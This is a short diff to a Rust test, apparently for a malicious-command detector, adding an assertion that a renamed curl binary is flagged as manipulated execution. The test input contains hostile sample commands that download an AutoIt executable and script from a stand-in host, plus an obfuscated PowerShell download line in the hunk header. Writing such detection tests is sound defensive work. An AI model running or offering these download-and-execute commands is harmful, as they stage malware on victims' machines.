@@ -21018,6 +21018,16 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
             "vjik -H \"User-Agent: curl\" -o Autoit3.exe http://curl-copy.example:2351\r\nvjik -o rugaiq.au3 http://curl-copy.example:2351/msi\r\n",
             &mut env,
         );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. } if target == "vjik"
+                )
+            }),
+            "copied curl alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
         for (url, dst) in [
             ("http://curl-copy.example:2351", "Autoit3.exe"),
             ("http://curl-copy.example:2351/msi", "rugaiq.au3"),
